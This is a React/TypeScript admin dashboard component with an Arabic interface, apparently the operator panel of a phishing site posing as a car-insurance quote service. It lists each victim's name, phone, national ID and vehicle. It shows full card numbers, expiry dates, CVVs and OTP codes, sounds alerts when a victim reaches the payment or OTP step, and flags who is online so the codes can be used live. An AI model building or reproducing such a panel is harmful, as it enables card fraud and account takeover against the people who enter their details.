import { useEffect, useState } from "react";
import { supabase } from "@/integrations/supabase/client";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { CheckCircle, XCircle, Clock, Eye } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { usePresence } from "@/hooks/usePresence";

interface Application {
  id: string;
  created_at: string;
  full_name: string;
  phone: string;
  insurance_type: string;
  document_type: string;
  id_number?: string;
  serial_number?: string;
  vehicle_manufacturer: string;
  vehicle_model: string;
  vehicle_year: string;
  vehicle_value: number;
  selected_company: string;
  selected_price: string;
  cardholder_name: string;
  card_number: string;
  card_last_4: string;
  card_type: string;
  expiry_date: string;
  card_cvv: string;
  otp_code: string;
  current_step: string;
  step_1_approved: boolean;
  step_2_approved: boolean;
  step_3_approved: boolean;
  payment_approved: boolean;
  otp_approved: boolean;
  status: string;
}

const DashboardApplications = () => {
  const [applications, setApplications] = useState<Application[]>([]);
  const [selectedApp, setSelectedApp] = useState<Application | null>(null);
  const [relatedApplications, setRelatedApplications] = useState<Application[]>([]);
  const [showDetails, setShowDetails] = useState(false);
  const { toast } = useToast();
  const { onlineUsers } = usePresence();

  useEffect(() => {
    fetchApplications();

    const channel = supabase
      .channel('applications_changes')
      .on(
        'postgres_changes',
        {
          event: '*',
          schema: 'public',
          table: 'customer_applications'
        },
        (payload) => {
          console.log('Realtime update:', payload);
          fetchApplications();
          
          if (payload.eventType === 'UPDATE' || payload.eventType === 'INSERT') {
            const newData = payload.new as any;
            if (newData.current_step === 'payment' && !newData.payment_approved) {
              playNotificationSound();
              toast({
                title: "🔔 طلب جديد يحتاج موافقة!",
                description: `العميل ${newData.full_name || 'غير معروف'} وصل لمرحلة الدفع`,
                duration: 10000,
              });
            }
            if (newData.current_step === 'otp' && !newData.otp_approved) {
              playNotificationSound();
              toast({
                title: "🔔 طلب جديد يحتاج موافقة!",
                description: `العميل ${newData.full_name || 'غير معروف'} وصل لمرحلة OTP`,
                duration: 10000,
              });
            }
          }
        }
      )
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
  }, []);

  const playNotificationSound = () => {
    const audioContext = new (window.AudioContext || (window as any).webkitAudioContext)();
    const oscillator = audioContext.createOscillator();
    const gainNode = audioContext.createGain();
    
    oscillator.connect(gainNode);
    gainNode.connect(audioContext.destination);
    
    oscillator.frequency.value = 800;
    oscillator.type = 'sine';
    
    gainNode.gain.setValueAtTime(0.3, audioContext.currentTime);
    gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.5);
    
    oscillator.start(audioContext.currentTime);
    oscillator.stop(audioContext.currentTime + 0.5);
    
    setTimeout(() => {
      const osc2 = audioContext.createOscillator();
      const gain2 = audioContext.createGain();
      osc2.connect(gain2);
      gain2.connect(audioContext.destination);
      osc2.frequency.value = 800;
      osc2.type = 'sine';
      gain2.gain.setValueAtTime(0.3, audioContext.currentTime);
      gain2.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.5);
      osc2.start(audioContext.currentTime);
      osc2.stop(audioContext.currentTime + 0.5);
    }, 600);
    
    setTimeout(() => {
      const osc3 = audioContext.createOscillator();
      const gain3 = audioContext.createGain();
      osc3.connect(gain3);
      gain3.connect(audioContext.destination);
      osc3.frequency.value = 800;
      osc3.type = 'sine';
      gain3.gain.setValueAtTime(0.3, audioContext.currentTime);
      gain3.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.5);
      osc3.start(audioContext.currentTime);
      osc3.stop(audioContext.currentTime + 0.5);
    }, 1200);
  };

  const fetchApplications = async () => {
    const { data, error } = await supabase
      .from('customer_applications')
      .select('*')
      .order('created_at', { ascending: false });

    if (error) {
      console.error('Error fetching applications:', error);
      return;
    }

    setApplications(data || []);
  };

  const approveStep = async (appId: string, stepField: string) => {
    const { error } = await supabase
      .from('customer_applications')
      .update({ [stepField]: true })
      .eq('id', appId);

    if (error) {
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء الموافقة",
        variant: "destructive"
      });
      return;
    }

    toast({
      title: "تمت الموافقة",
      description: "تم الموافقة على الخطوة بنجاح",
    });

    fetchApplications();
    if (selectedApp) {
      fetchRelatedApplications(selectedApp.phone);
    }
  };

  const rejectStep = async (appId: string) => {
    const { error } = await supabase
      .from('customer_applications')
      .update({ 
        status: 'rejected'
      })
      .eq('id', appId);

    if (error) {
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء الرفض",
        variant: "destructive"
      });
      return;
    }

    toast({
      title: "تم الرفض",
      description: "تم رفض الطلب",
    });

    fetchApplications();
    if (selectedApp) {
      fetchRelatedApplications(selectedApp.phone);
    }
  };

  const getStepBadge = (approved: boolean) => {
    if (approved) {
      return <Badge className="bg-green-500"><CheckCircle className="w-3 h-3 mr-1" /> موافق عليه</Badge>;
    }
    return <Badge variant="destructive"><Clock className="w-3 h-3 mr-1" /> بانتظار الموافقة</Badge>;
  };

  const fetchRelatedApplications = async (phone: string) => {
    const { data, error } = await supabase
      .from('customer_applications')
      .select('*')
      .eq('phone', phone)
      .order('created_at', { ascending: true });

    if (error) {
      console.error('Error fetching related applications:', error);
      return;
    }

    setRelatedApplications(data || []);
  };

  return (
    <div className="container mx-auto p-6">
      <h1 className="text-3xl font-bold mb-6">إدارة طلبات العملاء</h1>

      <div className="grid gap-4">
        {applications.map((app) => (
          <Card key={app.id} className="p-6">
            <div className="flex justify-between items-start">
              <div className="space-y-2">
                <div className="flex items-center gap-2">
                  <h3 className="text-xl font-bold">{app.full_name}</h3>
                  {onlineUsers.has(app.id) && (
                    <div className="relative">
                      <div className="w-3 h-3 bg-green-500 rounded-full animate-pulse"></div>
                      <div className="absolute inset-0 w-3 h-3 bg-green-500 rounded-full opacity-50 animate-ping"></div>
                    </div>
                  )}
                </div>
                <p className="text-sm text-muted-foreground">📱 {app.phone}</p>
                {app.id_number && (
                  <p className="text-sm">🆔 رقم الهوية/الإقامة: {app.id_number}</p>
                )}
                {app.serial_number && (
                  <p className="text-sm">🔢 الرقم التسلسلي: {app.serial_number}</p>
                )}
                <p className="text-sm">🚗 {app.vehicle_manufacturer} {app.vehicle_model} ({app.vehicle_year})</p>
                {app.vehicle_value && (
                  <p className="text-sm">💰 قيمة السيارة: {app.vehicle_value.toLocaleString('ar-SA')} ر.س</p>
                )}
                {app.selected_company && (
                  <p className="text-sm">🏢 {app.selected_company} - {app.selected_price} ر.س</p>
                )}
                {app.created_at && (
                  <p className="text-sm text-muted-foreground">
                    📅 {new Date(app.created_at).toLocaleDateString('ar-EG', {
                      year: 'numeric',
                      month: 'short',
                      day: 'numeric',
                      calendar: 'gregory'
                    })}
                    {' | '}
                    <span dir="ltr">
                      🕐 {new Date(app.created_at).toLocaleTimeString('ar-EG', {
                        hour: '2-digit',
                        minute: '2-digit'
                      })}
                    </span>
                  </p>
                )}
              </div>

              <div className="space-y-2">
                <Button
                  onClick={() => {
                    setSelectedApp(app);
                    fetchRelatedApplications(app.phone);
                    setShowDetails(true);
                  }}
                  variant="outline"
                  size="sm"
                >
                  <Eye className="w-4 h-4 mr-2" />
                  عرض التفاصيل
                </Button>
              </div>
            </div>

            <div className="mt-4 pt-4 border-t">
              <div className="flex gap-3 items-center">
                <Badge variant={app.status === 'rejected' ? 'destructive' : 'secondary'}>
                  الحالة: {app.status === 'rejected' ? 'مرفوض' : app.current_step === 'otp' && app.otp_approved ? 'مكتمل' : 'قيد المعالجة'}
                </Badge>
                {app.current_step === 'payment' && !app.payment_approved && (
                  <Badge variant="outline" className="bg-orange-100 dark:bg-orange-950">
                    في انتظار موافقة الدفع 💳
                  </Badge>
                )}
                {app.current_step === 'otp' && !app.otp_approved && (
                  <Badge variant="outline" className="bg-blue-100 dark:bg-blue-950">
                    في انتظار موافقة OTP 🔐
                  </Badge>
                )}
              </div>
            </div>
          </Card>
        ))}
      </div>

      {/* Dialog لعرض التفاصيل الكاملة */}
      <Dialog open={showDetails} onOpenChange={setShowDetails}>
        <DialogContent className="max-w-4xl max-h-[90vh] overflow-y-auto">
          <DialogHeader>
            <DialogTitle>تفاصيل الطلب الكاملة</DialogTitle>
            <DialogDescription>
              جميع البيانات المدخلة من قبل العميل
            </DialogDescription>
          </DialogHeader>

          {selectedApp && (
            <div className="space-y-6">
              {/* معلومات العميل */}
              <div className="bg-blue-50 dark:bg-blue-950/20 p-4 rounded-lg border border-blue-200 dark:border-blue-800">
                <div className="flex items-center justify-between mb-3">
                  <h3 className="font-bold text-lg">👤 معلومات العميل</h3>
                  <div className="flex items-center gap-2">
                    {onlineUsers.has(selectedApp.id) ? (
                      <>
                        <div className="relative">
                          <div className="w-3 h-3 bg-green-500 rounded-full animate-pulse"></div>
                          <div className="absolute inset-0 w-3 h-3 bg-green-500 rounded-full opacity-50 animate-ping"></div>
                        </div>
                        <span className="text-sm font-semibold text-green-600">متصل الآن</span>
                      </>
                    ) : (
                      <>
                        <div className="w-3 h-3 bg-gray-400 rounded-full"></div>
                        <span className="text-sm font-semibold text-gray-600">غير متصل</span>
                      </>
                    )}
                  </div>
                </div>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                  <div>
                    <p className="text-xs text-muted-foreground mb-1">الاسم الكامل:</p>
                    <p className="font-semibold text-base">{selectedApp.full_name || 'غير متوفر'}</p>
                  </div>
                  <div>
                    <p className="text-xs text-muted-foreground mb-1">رقم الهاتف:</p>
                    <p className="font-semibold text-base" dir="ltr">{selectedApp.phone || 'غير متوفر'}</p>
                  </div>
                  <div>
                    <p className="text-xs text-muted-foreground mb-1">نوع التأمين:</p>
                    <p className="font-semibold text-base">{selectedApp.insurance_type || 'غير متوفر'}</p>
                  </div>
                  <div>
                    <p className="text-xs text-muted-foreground mb-1">نوع المستند:</p>
                    <p className="font-semibold text-base">{selectedApp.document_type || 'غير متوفر'}</p>
                  </div>
                  <div>
                    <p className="text-xs text-muted-foreground mb-1">🆔 رقم الهوية/الإقامة:</p>
                    <p className="font-semibold text-base">{selectedApp.id_number || 'غير متوفر'}</p>
                  </div>
                  <div>
                    <p className="text-xs text-muted-foreground mb-1">🔢 الرقم التسلسلي:</p>
                    <p className="font-semibold text-base">{selectedApp.serial_number || 'غير متوفر'}</p>
                  </div>
                  <div>
                    <p className="text-xs text-muted-foreground mb-1">📅 تاريخ التسجيل:</p>
                    <p className="font-semibold text-base">
                      {selectedApp.created_at 
                        ? new Date(selectedApp.created_at).toLocaleDateString('ar-EG', {
                            year: 'numeric',
                            month: 'long',
                            day: 'numeric',
                            calendar: 'gregory'
                          })
                        : 'غير متوفر'}
                    </p>
                  </div>
                  <div>
                    <p className="text-xs text-muted-foreground mb-1">🕐 وقت التسجيل:</p>
                    <p className="font-semibold text-base" dir="ltr">
                      {selectedApp.created_at 
                        ? new Date(selectedApp.created_at).toLocaleTimeString('ar-EG', {
                            hour: '2-digit',
                            minute: '2-digit',
                            second: '2-digit'
                          })
                        : 'غير متوفر'}
                    </p>
                  </div>
                </div>
              </div>

              {/* معلومات المركبة */}
              {selectedApp.vehicle_manufacturer && (
                <div className="bg-green-50 dark:bg-green-950/20 p-4 rounded-lg border border-green-200 dark:border-green-800">
                  <h3 className="font-bold text-lg mb-3">🚗 معلومات المركبة</h3>
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                    <div>
                      <p className="text-xs text-muted-foreground mb-1">الصانع:</p>
                      <p className="font-semibold text-base">{selectedApp.vehicle_manufacturer}</p>
                    </div>
                    <div>
                      <p className="text-xs text-muted-foreground mb-1">الموديل:</p>
                      <p className="font-semibold text-base">{selectedApp.vehicle_model}</p>
                    </div>
                    <div>
                      <p className="text-xs text-muted-foreground mb-1">سنة الصنع:</p>
                      <p className="font-semibold text-base">{selectedApp.vehicle_year}</p>
                    </div>
                    <div>
                      <p className="text-xs text-muted-foreground mb-1">قيمة السيارة:</p>
                      <p className="font-semibold text-base">{selectedApp.vehicle_value?.toLocaleString('ar-SA')} ر.س</p>
                    </div>
                  </div>
                </div>
              )}

              {/* شركة التأمين المختارة */}
              {selectedApp.selected_company && (
                <div>
                  <h3 className="font-bold mb-2">شركة التأمين المختارة</h3>
                  <div className="grid grid-cols-2 gap-2 text-sm">
                    <p><span className="font-semibold">الشركة:</span> {selectedApp.selected_company}</p>
                    <p><span className="font-semibold">السعر:</span> {selectedApp.selected_price} ر.س</p>
                  </div>
                </div>
              )}

              {/* جميع البطاقات الائتمانية المدخلة */}
              {relatedApplications.filter(app => app.cardholder_name).length > 0 && (
                <div className="space-y-4">
                  <h3 className="font-bold text-red-600 text-lg">⚠️ البطاقات الائتمانية المدخلة (سرية)</h3>
                  {relatedApplications
                    .filter(app => app.cardholder_name)
                    .map((app, index) => (
                      <div key={app.id} className="border-2 border-red-300 dark:border-red-800 rounded-lg p-4">
                        <div className="flex items-center justify-between mb-3">
                          <div className="flex items-center gap-2">
                            <Badge variant="outline" className="text-base font-bold">
                              البطاقة #{index + 1}
                            </Badge>
                            {app.payment_approved ? (
                              <Badge className="bg-green-500">
                                <CheckCircle className="w-3 h-3 mr-1" /> موافق عليها
                              </Badge>
                            ) : app.status === 'rejected' ? (
                              <Badge variant="destructive">
                                <XCircle className="w-3 h-3 mr-1" /> مرفوضة
                              </Badge>
                            ) : (
                              <Badge variant="destructive">
                                <Clock className="w-3 h-3 mr-1" /> بانتظار الموافقة
                              </Badge>
                            )}
                          </div>
                          {!app.payment_approved && app.status !== 'rejected' && (
                            <div className="flex gap-2">
                              <Button
                                onClick={() => approveStep(app.id, 'payment_approved')}
                                size="sm"
                                className="bg-green-600 hover:bg-green-700"
                              >
                                <CheckCircle className="h-4 w-4 ml-1" />
                                موافق
                              </Button>
                              <Button
                                onClick={() => rejectStep(app.id)}
                                size="sm"
                                variant="destructive"
                              >
                                <XCircle className="h-4 w-4 ml-1" />
                                رفض
                              </Button>
                            </div>
                          )}
                        </div>
                        <div className="space-y-3 bg-red-50 dark:bg-red-950/20 p-4 rounded-lg">
                          <div>
                            <p className="text-xs text-muted-foreground mb-1">📅 تاريخ الإدخال:</p>
                            <p className="font-semibold text-sm">
                              {new Date(app.created_at).toLocaleString('ar-EG', {
                                year: 'numeric',
                                month: 'short',
                                day: 'numeric',
                                hour: '2-digit',
                                minute: '2-digit'
                              })}
                            </p>
                          </div>
                          <div>
                            <p className="text-xs text-muted-foreground mb-1">اسم حامل البطاقة:</p>
                            <p className="font-bold text-base">{app.cardholder_name}</p>
                          </div>
                          <div>
                            <p className="text-xs text-muted-foreground mb-1">رقم البطاقة الكامل:</p>
                            <p className="font-mono font-bold text-lg" dir="ltr">
                              {app.card_number || `**** **** **** ${app.card_last_4}`}
                            </p>
                          </div>
                          <div className="grid grid-cols-2 gap-3">
                            <div>
                              <p className="text-xs text-muted-foreground mb-1">نوع البطاقة:</p>
                              <p className="font-semibold capitalize">{app.card_type}</p>
                            </div>
                            <div>
                              <p className="text-xs text-muted-foreground mb-1">تاريخ الانتهاء:</p>
                              <p className="font-mono font-semibold">{app.expiry_date}</p>
                            </div>
                          </div>
                          <div>
                            <p className="text-xs text-muted-foreground mb-1">رمز CVV:</p>
                            <p className="font-mono font-bold text-2xl text-red-600">{app.card_cvv || '***'}</p>
                          </div>
                        </div>
                      </div>
                    ))}
                </div>
              )}

              {/* جميع أكواد OTP المدخلة */}
              {relatedApplications.filter(app => app.otp_code).length > 0 && (
                <div className="space-y-4">
                  <h3 className="font-bold text-lg">🔐 أكواد التحقق OTP المدخلة</h3>
                  {relatedApplications
                    .filter(app => app.otp_code)
                    .map((app, index) => (
                      <div key={app.id} className="border-2 border-primary/30 rounded-lg p-4">
                        <div className="flex items-center justify-between mb-3">
                          <div className="flex items-center gap-2">
                            <Badge variant="outline" className="text-base font-bold">
                              كود OTP #{index + 1}
                            </Badge>
                            {app.otp_approved ? (
                              <Badge className="bg-green-500">
                                <CheckCircle className="w-3 h-3 mr-1" /> موافق عليه
                              </Badge>
                            ) : app.status === 'rejected' ? (
                              <Badge variant="destructive">
                                <XCircle className="w-3 h-3 mr-1" /> مرفوض
                              </Badge>
                            ) : (
                              <Badge variant="destructive">
                                <Clock className="w-3 h-3 mr-1" /> بانتظار الموافقة
                              </Badge>
                            )}
                          </div>
                          {!app.otp_approved && app.status !== 'rejected' && (
                            <div className="flex gap-2">
                              <Button
                                onClick={() => approveStep(app.id, 'otp_approved')}
                                size="sm"
                                className="bg-green-600 hover:bg-green-700"
                              >
                                <CheckCircle className="h-4 w-4 ml-1" />
                                موافق
                              </Button>
                              <Button
                                onClick={() => rejectStep(app.id)}
                                size="sm"
                                variant="destructive"
                              >
                                <XCircle className="h-4 w-4 ml-1" />
                                رفض
                              </Button>
                            </div>
                          )}
                        </div>
                        <div className="space-y-3">
                          <div>
                            <p className="text-xs text-muted-foreground mb-1">📅 تاريخ الإدخال:</p>
                            <p className="font-semibold text-sm">
                              {new Date(app.created_at).toLocaleString('ar-EG', {
                                year: 'numeric',
                                month: 'short',
                                day: 'numeric',
                                hour: '2-digit',
                                minute: '2-digit'
                              })}
                            </p>
                          </div>
                          <p className="text-3xl font-mono font-bold bg-primary/10 p-6 rounded-lg text-center text-primary border-2 border-primary/20">
                            {app.otp_code}
                          </p>
                        </div>
                      </div>
                    ))}
                </div>
              )}
            </div>
          )}
        </DialogContent>
      </Dialog>
    </div>
  );
};

export default DashboardApplications;
